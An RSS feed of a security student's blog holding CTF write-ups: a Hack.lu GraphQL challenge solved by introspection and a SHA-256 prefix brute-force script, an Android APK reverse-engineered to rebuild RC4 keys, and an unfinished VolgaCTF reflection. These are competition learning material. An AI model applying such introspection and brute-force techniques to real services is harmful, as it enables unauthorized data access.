<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Jam Polintan</title>
        <link>https://jamvie.net/posts/</link>
        <description>Recent content in Posts on Jam Polintan</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
        <lastBuildDate>Sun, 25 Oct 2020 22:34:34 -0600</lastBuildDate>
        <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hack.lu 2020: Confessions</title>
            <link>https://jamvie.net/posts/2020/10/hack.lu-2020-confessions/</link>
            <pubDate>Sun, 25 Oct 2020 22:34:34 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/10/hack.lu-2020-confessions/</guid>
            <description>This is a writeup for &amp;ldquo;Confessions&amp;rdquo;, the first web challenge I solved. I was luckily able to finish this challenge in a couple hours, so I could focus my attention to the other super interesting web problems. Confessions was a nice dive into some simple GraphQL manipulation and baby crypto.
Let&amp;rsquo;s Begin! The confessions webpage was a message-generation application that would hash (in sha-256) your message based on the title and content of it.</description>
            <content type="html"><![CDATA[<p>This is a writeup for &ldquo;Confessions&rdquo;, the first web challenge I solved. I was luckily able to finish this challenge in a couple hours, so I could focus my attention to the other super interesting web problems. Confessions was a nice dive into some simple GraphQL manipulation and baby crypto.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>The confessions webpage was a message-generation application that would hash (in sha-256) your message based on the title and content of it. Under the hood we see the nature of how these messages are stored:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// talk to the GraphQL endpoint
</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">gql</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">query</span>, <span style="color:#a6e22e">variables</span><span style="color:#f92672">=</span>{}) =&gt; {
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/graphql&#39;</span>, {
        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
            <span style="color:#e6db74">&#39;content-type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>,
        },
        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
            <span style="color:#a6e22e">operationName</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>,
            <span style="color:#a6e22e">query</span>,
            <span style="color:#a6e22e">variables</span>,
        }),
    });
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">json</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>();
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">errors</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">length</span>) {
        <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">errors</span>;
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">data</span>;
    }
};

<span style="color:#75715e">// some queries/mutations
</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getConfession</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">async</span> <span style="color:#a6e22e">hash</span> =&gt; <span style="color:#a6e22e">gql</span>(<span style="color:#e6db74">&#39;query Q($hash: String) { confession(hash: $hash) { title, hash } }&#39;</span>, { <span style="color:#a6e22e">hash</span> }).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">confession</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getConfessionWithMessage</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">async</span> <span style="color:#a6e22e">id</span> =&gt; <span style="color:#a6e22e">gql</span>(<span style="color:#e6db74">&#39;mutation Q($id: String) { confessionWithMessage(id: $id) { title, hash, message } }&#39;</span>, { <span style="color:#a6e22e">id</span> }).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">confessionWithMessage</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">addConfession</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">title</span>, <span style="color:#a6e22e">message</span>) =&gt; <span style="color:#a6e22e">gql</span>(<span style="color:#e6db74">&#39;mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { id } }&#39;</span>, { <span style="color:#a6e22e">title</span>, <span style="color:#a6e22e">message</span> }).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">addConfession</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">previewHash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">title</span>, <span style="color:#a6e22e">message</span>) =&gt; <span style="color:#a6e22e">gql</span>(<span style="color:#e6db74">&#39;mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { hash } }&#39;</span>, { <span style="color:#a6e22e">title</span>, <span style="color:#a6e22e">message</span> }).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span> =&gt; <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">addConfession</span>);

</code></pre></div><p>The application uses graphQL as an intermediary to the database. Specifically, the client &ldquo;talks&rdquo; to graphql via the <code>\graphql</code> endpoint. If we take a look at what happens when we create a message:</p>

    <img src="/images/confessionsresearch.png"  alt="research"  class="center"  style="border-radius: 8px;"  />


<p>The construction of this &ldquo;mutation&rdquo; object is common in graphQL implementations. However, to actually &ldquo;talk&rdquo; to the endpoint, you don&rsquo;t always need to generate a mutation object.</p>
<p>What else can we ask of the endpoint?  If we perform some regular <a href="https://graphql.org/learn/introspection/">introspection</a> into their graphQL infrastructure, we see something interesting (I&rsquo;m using the graphQL IDE here to avoid having to worry about formatting in an API request):</p>

    <img src="/images/confessionsschema.png"  alt="schema"  class="center"  style="border-radius: 8px;"  />


<p>The description on the query&rsquo;s field <code>accessLog</code> is the big hint here. Let&rsquo;s expand upon <code>accessLog</code> further:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#960050;background-color:#1e0010">accessLog{</span>
    <span style="color:#960050;background-color:#1e0010">name</span>
    <span style="color:#960050;background-color:#1e0010">timestamp</span>
    <span style="color:#960050;background-color:#1e0010">args</span>
  }
<span style="color:#960050;background-color:#1e0010">}</span>
</code></pre></div>
    <img src="/images/confessionsaccess.png"  alt="accessLog"  class="center"  style="border-radius: 8px;"  />


<p>We recieve a list of hashes, also in sha-256. Running the first 4 hashes through an online sha-256 database reveal to me that they decrypt to &ldquo;f&rdquo;, &ldquo;fl&rdquo;, &ldquo;fla&rdquo;, then finally &ldquo;flag&rdquo;. The full flag of this challenge is obviously the very last hash in this <code>accessLog</code>, so now we must bruteforce the incoming letters (which isn&rsquo;t too crazy. If we operate under the assumption that the flag has letters that are all lowercase, numbers 0-9, and maybe the <code>-</code> or <code>_</code> chars, we are dealing with 38 bits of entropy per letter, which is manageable. Additionally, we are aware by convention that all flags start with <code>flag{</code> and the last char is <code>}</code>, so we can already figure out what the 5th hash decrypts to). Special thanks to teammate Filip for explaining to me how to do it :-)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


alphanumerics <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz1234567890{}_-&#34;</span>
hashes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;&#34;&#34;all the hashes found in accessLog. There were a lot.&#34;&#34;&#34;</span>]

flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>


<span style="color:#66d9ef">for</span> hash <span style="color:#f92672">in</span> hashes:
	<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> alphanumerics:
		m <span style="color:#f92672">=</span> sha256()
		m<span style="color:#f92672">.</span>update(flag <span style="color:#f92672">+</span> c<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
		testhash <span style="color:#f92672">=</span> enhex(m<span style="color:#f92672">.</span>digest())
		<span style="color:#66d9ef">if</span> (testhash <span style="color:#f92672">==</span> hash):
			flag <span style="color:#f92672">+=</span> c<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
			<span style="color:#66d9ef">print</span> (flag)
			<span style="color:#66d9ef">continue</span>
</code></pre></div>
    <img src="/images/confessionsflag.png"  alt="flag"  class="center"  style="border-radius: 8px;"  />


<p>And that&rsquo;s that! A quick and straightforward challenge. It was a good warmup into the other excellent web problems I saw :)</p>
<h4 id="vie">Vie</h4>
]]></content>
        </item>
        
        <item>
            <title>Trend Micro CTF: Raimund Genes Quals 2020</title>
            <link>https://jamvie.net/posts/2020/10/trend-micro-ctf-raimund-genes-quals-2020/</link>
            <pubDate>Sun, 04 Oct 2020 13:12:06 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/10/trend-micro-ctf-raimund-genes-quals-2020/</guid>
            <description>Last year, before I became an active participant in Maple Bacon, the team went on to participate in and land a top 10 position in Trend Micro 2019 Qualifiers, later going on to compete in the finals of that year. When the 2020 serving came up this weekend, I wanted to keep with tradition and maintain the pattern - and so we landed a top 10 position and will be going on ahead to the 2020 finals :)</description>
            <content type="html"><![CDATA[<p>Last year, before I became an active participant in Maple Bacon, the team went on to participate in and land a top 10 position in Trend Micro 2019 Qualifiers, later going on to compete in the finals of that year. When the 2020 serving came up this weekend, I wanted to keep with tradition and maintain the pattern - and so we landed a top 10 position and will be going on ahead to the 2020 finals :)</p>
<!-- raw HTML omitted -->
<p>During the event, I was focused on one problem alongside my teammate Arctic, our resident crypto expert. Special thanks to Robert as well for assisting me throughout the challenge! The problem we were focused on was the RF-Mobile challenge known as &ldquo;Keybox&rdquo;.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>Keybox is an android app. The zip file of the challenge contained a single APK file, which I popped into android studio to poke around in, and used <code>jadx</code> to manually look through the files as well. In the APK, the <code>AndroidManifest.xml</code> file was far more informative than it regularly would be, defining several unique intents as well as new behaviour for other ones. The app itself, &ldquo;Keybox&rdquo;, was essentially a psuedo-spyware program - based on what you did while the app was open, it would listen in on any intents you made and act accordingly.</p>

    <img src="/images/AppView.png"  alt="AppView"  class="center"  style="border-radius: 8px;"  />


<p>The app itself was straightforward enough. The flag was in it, but encoded in rc4, with a specific key that was split across 5 values that themselves were encoded (also in rc4) with unique keys of their own. The idea was that you had to &ldquo;solve&rdquo; 5 levels in order to have the app decode the key fragment for you. There were hints (also encoded, but with the same key) that gave you a clue as to what to do to decrypt the key fragment. Once you decrypted all 5 keys, you combine it and use it as the key to decrypt the flag.</p>
<p>So, let&rsquo;s quickly review:</p>
<ul>
<li>
<p>the flag is encoded in rc4. The key for the flag&rsquo;s encoding algorithm is split into 5 other key bits.</p>
</li>
<li>
<p>those key bits are also encoded in rc4, each key bit having their own unique encoding key. However, there are hints as to how to unlock them.</p>
</li>
<li>
<p>those hints are encoded too. Luckily, the hints all share the same decryption key.</p>
</li>
</ul>
<p>Great! So we know nothing. Let&rsquo;s just jump into it.</p>
<h3 id="key-0">Key 0</h3>
<p>First up, key 0. The hint was already decoded for us:</p>

    <img src="/images/Key0Hints.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>But the actual key bit itself was still unknown. So I poked around in the <code>AndroidManifest.xml</code> file and saw this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">       <span style="color:#f92672">&lt;activity</span>
            <span style="color:#a6e22e">android:theme=</span><span style="color:#e6db74">&#34;@ref/0x7f0e0008&#34;</span>
            <span style="color:#a6e22e">android:label=</span><span style="color:#e6db74">&#34;@ref/0x7f0d003a&#34;</span>
            <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;com.trendmicro.keybox.KEY1HintActivity&#34;</span>
            <span style="color:#a6e22e">android:exported=</span><span style="color:#e6db74">&#34;true&#34;</span>
            <span style="color:#a6e22e">android:hint=</span><span style="color:#e6db74">&#34;Unlocking the hints requires sending the appropriate intent : adb shell am start-activity -a com.trendmicro.keybox.UNLOCK_HINT -n com.trendmicro.keybox/.KEY1HintActivity -e hintkey1 $PASSWORD&#34;</span>
            <span style="color:#a6e22e">android:parentActivityName=</span><span style="color:#e6db74">&#34;com.trendmicro.keybox.KeyboxMainActivity&#34;</span><span style="color:#f92672">&gt;</span>

            <span style="color:#f92672">&lt;intent-filter&gt;</span>

                <span style="color:#f92672">&lt;action</span>
                    <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;com.trendmicro.keybox.UNLOCK_HINT&#34;</span> <span style="color:#f92672">/&gt;</span>

                <span style="color:#f92672">&lt;category</span>
                    <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.category.LAUNCHER&#34;</span> <span style="color:#f92672">/&gt;</span>
            <span style="color:#f92672">&lt;/intent-filter&gt;</span>

            <span style="color:#f92672">&lt;meta-data</span>
                <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.support.PARENT_ACTIVITY&#34;</span>
                <span style="color:#a6e22e">android:value=</span><span style="color:#e6db74">&#34;com.trendmicro.keybox.KeyboxMainActivity&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;/activity&gt;</span>
        
</code></pre></div><p>This was to unlock the hint for key 1. It was an app-specific intent that required a password. The intent itself would actually decrypt the hint, with the password you provided it as the key (am I using &lsquo;key&rsquo; too much here?). Since the actual &ldquo;hint&rdquo; in key 0 didn&rsquo;t really deliver information to me about <em>how</em> to unlock key 0, I figured I would request the hint again. But I didn&rsquo;t know the password value(more on this later). So Arctic and I bounced a few ideas back and forth until I thought to sanity check and use the same password provided to us to unzip the challenge file.</p>

    <img src="/images/Key0Decrypt.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>I&rsquo;m not sure why that worked. I&rsquo;m not totally sure this was intended or not. But regardless, the key for key 0&rsquo;s encryption process was the password that was used to unzip the challenge file. Later on, Arctic mentioned that the real hint for key 0 we maybe never found out, and we ended up just correctly guessing the key to decode key0.</p>
<h3 id="key-1">Key 1</h3>
<p>So on a bit of lucky streak, I continued on to key 1, while Arctic decrypted the hints. Because we still didn&rsquo;t know the encryption key for the hints, Arctic used a scoring function to decode as much of the hints in the ciphertexts as possible. The bits and pieces she recovered for key1&rsquo;s hint was:</p>
<pre><code>To unlock Key 1, you must call Trend Micro.
</code></pre><p>It was at this point that I was examining the other classes in the APK that I realized that the encryption key was hidden in the singleton class - <code>TrendMicro</code>.</p>
<p>Another teammate and mentor Robert quickly spun up a python script called <code>decrypt.py</code> to automate much of the decrypting process, now that we figured out the password.
But the full hint for key 1 didn&rsquo;t reveal anything else. That was the whole hint.</p>
<p>So now I had to look at and see how the app listens in for incoming and outgoing calls.</p>
<p>I spent a good portion of my time calling up all possible Trend Micro office numbers through my emulator, and simulating incoming calls from them, to no avail. And so I thought about it a bit more:</p>
<p>In the observer class in the APK file, they instantiated a listener to look for incoming calls (the CALL_STATE android intent). The hint suggested to call the office, but the code itself seemed to only be paying attention to incoming callers, not calls you make. Wether or not the intention was to do both, I thought about how this would work.</p>
<p>Since the app was listening in on call history, how would it then know when to decrypt KEY1? What is the encryption key it&rsquo;s looking for? Well, since the hint and the code all pointed to the act of making and recieving calls, then the encryption key to decode KEY1 must be a phone number. And wether or not I was having luck with dialing all possible offices to see if the app&rsquo;s listener would take notice, the components were all there. The encryption key had to be a phone number. We knew that KEY1 bit was encoded in rc4. So, couldn&rsquo;t we just take the .enc file and give it a couple Trend Micro phone numbers as a key, and run it through the rc4 decryption process?</p>
<p>It turned out that the phone number for Trend Micro&rsquo;s Japan HQ was the key to decrypt KEY1.</p>

    <img src="/images/key1Decrypt.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h3 id="key-2">Key 2</h3>
<p>With that being said, key 2 was way easier to decrypt. The hint for it was simple:</p>
<pre><code>To unlock KEY2, send the secret code.
</code></pre><p>Which is sufficiently vague, but &ldquo;secret codes&rdquo; are meaningful in Android developement.</p>
<p>Secret codes are specific sequences of numbers that could perform special actions. For example, the code <code>232338</code> would reveal your android phone&rsquo;s MAC address. Applications can also use them to perform secret tasks or unlock hidden features. If you wanted to test this out on your android device, open up your dialer and input a secret code as so:
<code>*#*#123456#*#*</code>.</p>
<p>In the <code>AndroidManifest.xml</code> file, the SECRET_CODE intent is defined:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">            <span style="color:#f92672">&lt;intent-filter&gt;</span>
                <span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.provider.Telephony.SECRET_CODE&#34;</span><span style="color:#f92672">/&gt;</span>
                <span style="color:#f92672">&lt;data</span> <span style="color:#a6e22e">android:host=</span><span style="color:#e6db74">&#34;\ 8736364276&#34;</span> <span style="color:#a6e22e">android:scheme=</span><span style="color:#e6db74">&#34;android_secret_code&#34;</span><span style="color:#f92672">/&gt;</span>
                <span style="color:#f92672">&lt;data</span> <span style="color:#a6e22e">android:host=</span><span style="color:#e6db74">&#34;\ 8736364275&#34;</span> <span style="color:#a6e22e">android:scheme=</span><span style="color:#e6db74">&#34;android_secret_code&#34;</span><span style="color:#f92672">/&gt;</span>
            <span style="color:#f92672">&lt;/intent-filter&gt;</span>
</code></pre></div><p>So the secret code in the app is the encryption key for KEY2!</p>
<p>You can either use <code>abd</code> to send the <code>android.provider.Telephony.SECRET_CODE</code> intent or just use the dialer in the emulator, as the app has a listener on the call function. Either way, you get KEY2.</p>

    <img src="/images/Key2Decrypt.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h2 id="key-3">Key 3</h2>
<p>The hint for Key3 was:</p>
<pre><code>Unlock KEY3 by sending the right text message. 
</code></pre><p>This requires some explanation on the architecture of text messages in an android phone.</p>
<p>SMS messages are kept in a relational database - specifically, sqlite. In the APK&rsquo;s observer class, we see some interesting checking going on:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    invoke<span style="color:#f92672">-</span><span style="color:#66d9ef">interface</span> <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#a6e22e">v5</span><span style="color:#f92672">,</span> v2<span style="color:#f92672">},</span> Landroid<span style="color:#f92672">/</span>database<span style="color:#f92672">/</span>Cursor<span style="color:#f92672">;-&gt;</span>getColumnName<span style="color:#f92672">(</span>I<span style="color:#f92672">)</span>Ljava<span style="color:#f92672">/</span>lang<span style="color:#f92672">/</span>String<span style="color:#f92672">;</span>

    move<span style="color:#f92672">-</span>result<span style="color:#f92672">-</span>object v5

    invoke<span style="color:#f92672">-</span>virtual <span style="color:#f92672">{</span>v4<span style="color:#f92672">,</span> v5<span style="color:#f92672">},</span> Ljava<span style="color:#f92672">/</span>lang<span style="color:#f92672">/</span>String<span style="color:#f92672">;-&gt;</span>equals<span style="color:#f92672">(</span>Ljava<span style="color:#f92672">/</span>lang<span style="color:#f92672">/</span>Object<span style="color:#f92672">;)</span>Z

    move<span style="color:#f92672">-</span>result v4

    <span style="color:#66d9ef">if</span><span style="color:#f92672">-</span>eqz v4<span style="color:#f92672">,</span> <span style="color:#f92672">:</span>cond_a8

    iget<span style="color:#f92672">-</span>object v4<span style="color:#f92672">,</span> p0<span style="color:#f92672">,</span> Lcom<span style="color:#f92672">/</span>trendmicro<span style="color:#f92672">/</span>keybox<span style="color:#f92672">/</span>Observer<span style="color:#f92672">;-&gt;</span>cursor<span style="color:#f92672">:</span>Landroid<span style="color:#f92672">/</span>database<span style="color:#f92672">/</span>Cursor<span style="color:#f92672">;</span>

    iget<span style="color:#f92672">-</span>object v5<span style="color:#f92672">,</span> p0<span style="color:#f92672">,</span> Lcom<span style="color:#f92672">/</span>trendmicro<span style="color:#f92672">/</span>keybox<span style="color:#f92672">/</span>Observer<span style="color:#f92672">;-&gt;</span>cursor<span style="color:#f92672">:</span>Landroid<span style="color:#f92672">/</span>database<span style="color:#f92672">/</span>Cursor<span style="color:#f92672">;</span>

    <span style="color:#66d9ef">const</span><span style="color:#f92672">-</span>string v6<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;type&#34;</span>

    invoke<span style="color:#f92672">-</span><span style="color:#66d9ef">interface</span> <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#a6e22e">v5</span><span style="color:#f92672">,</span> v6<span style="color:#f92672">},</span> Landroid<span style="color:#f92672">/</span>database<span style="color:#f92672">/</span>Cursor<span style="color:#f92672">;-&gt;</span>getColumnIndex<span style="color:#f92672">(</span>Ljava<span style="color:#f92672">/</span>lang<span style="color:#f92672">/</span>String<span style="color:#f92672">;)</span>I

    move<span style="color:#f92672">-</span>result v5

    invoke<span style="color:#f92672">-</span><span style="color:#66d9ef">interface</span> <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#a6e22e">v4</span><span style="color:#f92672">,</span> v5<span style="color:#f92672">},</span> Landroid<span style="color:#f92672">/</span>database<span style="color:#f92672">/</span>Cursor<span style="color:#f92672">;-&gt;</span>getInt<span style="color:#f92672">(</span>I<span style="color:#f92672">)</span>I
</code></pre></div><p>What&rsquo;s happening here? Well, long story short, when we send an SMS message, the app will access the SMS sqlite database and iterate through the columns of that database, and match the content of the text message to the column name. If there&rsquo;s a match, then the app will unlock the 3rd key for us. This must mean that the string needed to decrypt the third key bit must be one of the column names!</p>

    <img src="/images/Key3Decrypt.png"  alt="key3"  class="center"  style="border-radius: 8px;"  />


<p>The column name that decrypted KEY3 turned out to be &lsquo;body&rsquo;.</p>
<h2 id="key-4">Key 4</h2>
<p>Despite KEY4 having the longest hint, and arguably the most amount of time to do, KEY4 was remarkably simple. The details are in the function of the ciphertext:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// why actually calculate distance when you can just fake it ;)
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(Math.<span style="color:#a6e22e">abs</span>(<span style="color:#a6e22e">location_latitude</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">singleton_latitude</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.001</span> <span style="color:#f92672">&amp;&amp;</span> Math.<span style="color:#a6e22e">abs</span>(<span style="color:#a6e22e">location_longitude</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">singleton_longitude</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.001</span> ) {
            <span style="color:#a6e22e">Log</span>(<span style="color:#e6db74">&#34;Matched Location &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">location</span>);
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SHA1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Hashes</span>.<span style="color:#a6e22e">SHA1</span>;
            <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SHA1</span>.<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">location</span>)
            <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">hash</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>) {
                <span style="color:#a6e22e">location_match</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome to &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">location</span>;
            } <span style="color:#66d9ef">else</span> {
                <span style="color:#a6e22e">location_match</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome to &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">location</span>;
                <span style="color:#a6e22e">singleton</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>);
            }
            <span style="color:#66d9ef">break</span>;
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#a6e22e">location_match</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        }
    }


    <span style="color:#a6e22e">titleView</span>.<span style="color:#a6e22e">setText</span>(<span style="color:#e6db74">&#34;Key Four Hints&#34;</span>);
    <span style="color:#a6e22e">textView</span>.<span style="color:#a6e22e">setText</span>(
    <span style="color:#e6db74">&#34;Visit &#34;</span> <span style="color:#f92672">+</span> <span style="color:#75715e">/* all three of */</span> <span style="color:#e6db74">&#34;the headquarters to unlock Key 4&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n\n&#34;</span> <span style="color:#f92672">+</span>
    <span style="color:#a6e22e">location_match</span>
    );

    <span style="color:#66d9ef">return</span>(<span style="color:#66d9ef">true</span>)<span style="color:#e6db74">`
</span></code></pre></div><p>The hint specified to visit only the 3 headquarters, which were in the USA, Canada and Japan (Irving, Ontario and Tokyo respectively). While you can simulate your location in the emulator to pretend as if you visited all 3 locations, what it was looking for was the hash of the lat-lon location. It would check if that hash was among the list of accepted ones (which are only the hashes of the 3 HQs), and then append those hashes and use it as the key to decrypt KEY4.</p>
<p>So, we needed to just append the hashes of the 3 headquarters, and input that as our decryption key to key4.enc.</p>

    <img src="/images/Key4Decrypt.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h2 id="the-flag">The Flag</h2>
<p>With all 5 keys decrypted, all that was left was to combine them all and decrypt the flag.</p>
<p><code>TMCTF{pzDbkfWGcE}</code></p>
<p>Special thanks to my teammates, rctcwyvern and Robert for helping me out :) I&rsquo;m thankful I spent my earlier CS years playing around in Android Studio. I unknowingly gained some valuable skills needed to reverse engineer the APK. Goes to show how every little thing counts! :P</p>
<h4 id="vie">Vie</h4>
]]></content>
        </item>
        
        <item>
            <title>VolgaCTF Finals 2020</title>
            <link>https://jamvie.net/posts/2020/09/volgactf-finals-2020/</link>
            <pubDate>Sat, 19 Sep 2020 20:57:15 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/09/volgactf-finals-2020/</guid>
            <description>&lt;p&gt;A reflection on VolgaCTF Finals, which I participated in with my team. We were the only North American team participating in the event, and for a good portion of the CTF, we held 1st place! Unfortunately, that didn&amp;rsquo;t last for the end of the competition.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>A reflection on VolgaCTF Finals, which I participated in with my team. We were the only North American team participating in the event, and for a good portion of the CTF, we held 1st place! Unfortunately, that didn&rsquo;t last for the end of the competition.</p>
<p>This year of the finals round gave us an online offering of the attack-defense CTF competition, marking my first experience with attack-defense style CTFs. Overall the challenges and showmanship were alright throughout the competition, but a big barrier between my team and the others participating was the timezone. VolgaCTF was occuring in the midday in Russia, which was midnight in my timezone.</p>
<p>My team and I had to pull an all-nighter to partcipate in the finals round, and the lack of sleep was definitely to our disadvantage.</p>
<h2 id="the-setup">The Setup</h2>
<p>Since the round was online due to COVID-19, we did not participate in person. Our setup was all virtual: we used a VPN to connect to the VM instance given to us by the competition organizers. The setup was as so:</p>
<ul>
<li>
<p>We are given a unique vulnbox instance that are accessible only via the VPN connection, which we connected to on the day of.</p>
</li>
<li>
<p>The services (challenges) are all in the vulnbox, isolated via docker containers. There were 4 services in total, and we were responsible for their upkeep. This proved challenging - essentially adopting the role of sysadmin as we attempted to patch these services <em>and</em> keep them running. Every team&rsquo;s instance of a service were being flooded by requests from other teams to get flags, so we unintentionally adopted DevOps roles alongside hacking. If a service was down for us on our server, we couldn&rsquo;t obtain flags from other servers while it was down.</p>
</li>
<li>
<p>Flags were to be configured as <code>VolgaCTF{stuff here}</code> kept in a unique, specific encoding. We had a script that automated flag decoding and submission.</p>
</li>
</ul>
<h2 id="the-challenges">The Challenges</h2>
<p>The challenges were straightforward and almost all encompassed web-based exploits, which was a welcome developement for me. I focused on the last challenge, PDFer, as it was the longest unsolved service and I was obsessed with getting first blood on it :P.</p>
<h2 id="summary">Summary</h2>
